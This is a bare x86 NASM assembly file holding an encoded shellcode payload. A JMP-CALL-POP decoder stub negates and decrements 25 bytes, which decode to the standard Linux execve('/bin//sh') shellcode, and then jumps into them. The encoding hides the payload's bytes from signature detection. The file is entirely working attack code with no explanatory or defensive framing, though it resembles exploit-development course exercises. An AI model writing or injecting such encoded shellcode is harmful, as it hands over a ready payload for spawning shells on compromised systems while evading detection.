global _start			

section .text
_start:

	jmp short call_decoder

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25


decode:
	neg byte [esi]
	dec byte [esi]
	inc esi
	loop decode

	jmp short Shellcode



call_decoder:

	call decoder
	Shellcode: db -0x32,-0xc1,-0x51,-0x69,-0x30,-0x30,-0x74,-0x69,-0x69,-0x30,-0x63,-0x6a,-0x6f,-0x8a,-0xe4,-0x51,-0x8a,-0xe3,-0x54,-0x8a,-0xe2,-0xb1,-0xc,-0xce,-0x81

